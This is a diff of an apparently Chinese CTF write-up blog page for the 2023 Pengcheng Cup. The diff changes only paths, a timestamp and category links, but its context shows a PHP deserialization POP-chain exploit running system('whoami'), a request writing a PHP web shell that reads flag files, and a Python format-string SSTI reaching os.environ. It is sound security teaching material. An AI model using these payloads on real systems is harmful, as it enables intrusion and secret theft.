@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/background/fj_img/11.jpg">
 <meta property="article:published_time" content="2023-11-06T00:44:10.000Z">
-<meta property="article:modified_time" content="2023-11-08T12:52:15.823Z">
+<meta property="article:modified_time" content="2024-03-05T06:12:53.172Z">
 <meta property="article:author" content="dddkia">
 <meta property="article:tag" content="misc">
 <meta property="article:tag" content="wp">
@@ -366,24 +366,24 @@
 <p>预期</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$finish</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hacker</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;admin&quot;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">K</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$method</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish1-&gt;name = <span class="hljs-literal">true</span>;<br>        @<span class="hljs-variable language_">$this</span>-&gt;finish-&gt;finish = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;method = <span class="hljs-string">&#x27;system&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;args = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// pop</span><br><span class="hljs-comment">// H::__destruct   $username</span><br><span class="hljs-comment">// A::__toString   $hacker</span><br><span class="hljs-comment">// C::__get        $finish</span><br><span class="hljs-comment">// K::__call       $func</span><br><span class="hljs-comment">// E::__invoke     $hacker</span><br><span class="hljs-comment">// R::welcome</span><br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">K</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$aaa</span>-&gt;username-&gt;hacker-&gt;finish-&gt;func-&gt;hacker = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">R</span>();<br><br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/system/&quot;</span>, <span class="hljs-string">&quot;syssystemtem&quot;</span>, <span class="hljs-variable">$aaa</span>);<span class="hljs-comment">//用的preg_replace($filter,&#x27;&#x27;,$a);多加一个就行</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-comment">//O%3A1%3A%22H%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A6%3A%22finish%22%3BO%3A1%3A%22K%22%3A1%3A%7Bs%3A4%3A%22func%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A6%3A%22hacker%22%3BO%3A1%3A%22R%22%3A5%3A%7Bs%3A9%3A%22%00R%00method%22%3Bs%3A6%3A%22syssystemtem%22%3Bs%3A7%3A%22%00R%00args%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22whoami%22%3B%7Ds%3A3%3A%22key%22%3Bb%3A1%3Bs%3A7%3A%22finish1%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bb%3A1%3B%7Ds%3A6%3A%22finish%22%3BO%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A6%3A%22finish%22%3Bb%3A1%3B%7D%7D%7D%7D%7D%7D%7D</span><br></code></pre></td></tr></table></figure>
 <figure>
-<img src="../img/2023鹏城杯/169923146057815.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/169923146057815.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h2 id="web2">web2</h2>
 <p>前端有个scandir功能，输入目录，如果有此目录返回<code>yesyesyes!!!</code>，没有此目录返回<code>nonono~~~</code></p>
 <p>如下</p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605611.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605611.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>前端看到有个后门文件，但是如果单纯爆破文件名要16的16次方，显然不可能</p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605612.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605612.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>利用glob协议，匹配地找php，这样最多只要匹配16*16次即可得到文件名</p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605613.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605613.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>借用<a
@@ -393,7 +393,7 @@ target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/gupiindgyz7
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/sandbox/&#x27;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;5050f6511ffb64e1914be4ca8b9d585c&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;username&#x27;</span>]).<span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br>        <span class="hljs-variable">$title</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$data</span>)&gt;<span class="hljs-number">5</span>||<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$title</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>,<span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$title</span>)) &lt;= <span class="hljs-number">10</span>) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;php &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;rm &#x27;</span>.<span class="hljs-variable">$sandbox</span>.<span class="hljs-variable">$title</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no!no!no!&quot;</span>);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;reset&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;/bin/rm -rf &#x27;</span> . <span class="hljs-variable">$sandbox</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 <p>数组绕过</p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605614.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605614.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=datou&amp;title[]=<span class="hljs-number">1</span>&amp;data[]=<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -405,37 +405,37 @@ target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/gupiindgyz7
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from sqlite3 import *<br><br>from random import choice<br>from hashlib import sha512<br><br>from flask import Flask, request, Response<br>from flask_limiter import Limiter<br>from flask_limiter.util import get_remote_address<br><br>app = Flask(__name__)<br>limiter = Limiter(<br>    app=app,<br>    key_func=get_remote_address,<br>    default_limits=[<span class="hljs-string">&quot;50000 per hour&quot;</span>],<br>    storage_uri=<span class="hljs-string">&quot;memory://&quot;</span>,<br>)<br><br>salt = b<span class="hljs-string">&#x27;****************&#x27;</span><br><br>class PassHash(str):<br>    def __str__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>    def __repr__(self):<br>        <span class="hljs-built_in">return</span> sha512(salt + self.encode()).hexdigest()<br><br>con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>cur = con.cursor()<br>cur.execute(<span class="hljs-string">&quot;DROP TABLE IF EXISTS users&quot;</span>)<br>cur.execute(<span class="hljs-string">&quot;CREATE TABLE users(username, passhash)&quot;</span>)<br>passhash = PassHash(<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(choice(<span class="hljs-string">&quot;0123456789&quot;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(16)))<br>cur.execute(<br>    <span class="hljs-string">&quot;INSERT INTO users VALUES (?, ?)&quot;</span>,<br>    (<span class="hljs-string">&quot;admin&quot;</span>, str(passhash))<br>)<br>con.commit()<br><br>@app.route(<span class="hljs-string">&#x27;/source&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;1/second&quot;</span>)<br>def <span class="hljs-built_in">source</span>():<br>    <span class="hljs-built_in">return</span> Response(open(__file__).<span class="hljs-built_in">read</span>(), mimetype=<span class="hljs-string">&quot;text/plain&quot;</span>)<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>)<br>@limiter.limit(<span class="hljs-string">&quot;3/second&quot;</span>)<br>def index():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> not <span class="hljs-keyword">in</span> request.args or <span class="hljs-string">&#x27;password&#x27;</span> not <span class="hljs-keyword">in</span> request.args:<br>        <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;index.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-keyword">else</span>:<br>        username = request.args[<span class="hljs-string">&quot;username&quot;</span>]<br>        new_pwd = PassHash(request.args[<span class="hljs-string">&quot;password&quot;</span>])<br>        con = connect(<span class="hljs-string">&quot;users.db&quot;</span>)<br>        cur = con.cursor()<br>        res = cur.execute(<br>            <span class="hljs-string">&quot;SELECT * from users WHERE username = ? AND passhash = ?&quot;</span>,<br>            (username, str(new_pwd))<br>        )<br>        <span class="hljs-keyword">if</span> res.fetchone():<br>            <span class="hljs-built_in">return</span> open(<span class="hljs-string">&quot;secret.html&quot;</span>).<span class="hljs-built_in">read</span>()<br>        <span class="hljs-built_in">return</span> (<span class="hljs-string">&quot;Sorry, we couldn&#x27;t find a user &#x27;&#123;user&#125;&#x27; with password hash &lt;code&gt;&#123;&#123;passhash&#125;&#125;&lt;/code&gt;!&quot;</span><br>                .format(user=username)<br>                .format(passhash=new_pwd)<br>                )<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, 10000)<br></code></pre></td></tr></table></figure>
 <p>原题</p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605625.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605625.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>不熟悉ssti，但就看这个payload，结合ai和自己的见解简单分析一下（不一定对）</p>
 <p>因为<code>passhash=PassHash(''.join(choice("0123456789") for _ in range(16)))</code>，所以可以调用<code>__str__</code>方法</p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605626.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605626.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>然后获取全局<code>&#123;passhash.__str__.__globals__&#125;</code>，里面有app对象</p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605627.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605627.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>然后app内有个内置的<code>wsgi_app</code></p>
 <figure>
-<img src="../img/2023鹏城杯/16992314605628.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605628.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <figure>
-<img src="../img/2023鹏城杯/16992314605639.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/16992314605639.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>可以看到有os、sys模块</p>
 <figure>
-<img src="../img/2023鹏城杯/169923146056310.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/169923146056310.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>这样就可以调用这些模块了，原题有提示在env中，os.environ即可</p>
 <figure>
-<img src="../img/2023鹏城杯/169923146056311.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/169923146056311.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <h1 id="misc">MISC</h1>
@@ -445,19 +445,19 @@ target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/gupiindgyz7
 <p>看到文件中有很多504B0304，分离出zip</p>
 <p>拿到flag.txt、flag.wav、youshouldknowme.jpeg</p>
 <figure>
-<img src="../img/2023鹏城杯/169923146056312.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/169923146056312.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>flag.txt是snow隐写，密码为rar中的注释，得到flag3</p>
 <figure>
-<img src="../img/2023鹏城杯/169923146056413.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/169923146056413.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>flag.wav是sstv</p>
 <p>用rx-sstv可以看到一张二维码，扫出来得到flag2</p>
 <p>youshouldknowme.jpeg是steghide，密码在文件尾</p>
 <figure>
-<img src="../img/2023鹏城杯/169923146056414.png" srcset="/img/loading.gif" lazyload alt="img" />
+<img src="/img/2023鹏城杯/169923146056414.png" srcset="/img/loading.gif" lazyload alt="img" />
 <figcaption aria-hidden="true">img</figcaption>
 </figure>
 <p>拿到flag1</p>
@@ -490,7 +490,7 @@ target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/gupiindgyz7
     
       <span class="category-chain">
         
-  <a href="/categories/misc/" class="category-chain-item">misc</a>
+  <a href="/categories/web/" class="category-chain-item">web</a>
   
   
 
@@ -500,7 +500,7 @@ target="_blank" rel="noopener" href="https://www.yuque.com/dat0u/ctf/gupiindgyz7
     
       <span class="category-chain">
         
-  <a href="/categories/web/" class="category-chain-item">web</a>
+  <a href="/categories/misc/" class="category-chain-item">misc</a>
   
   
 
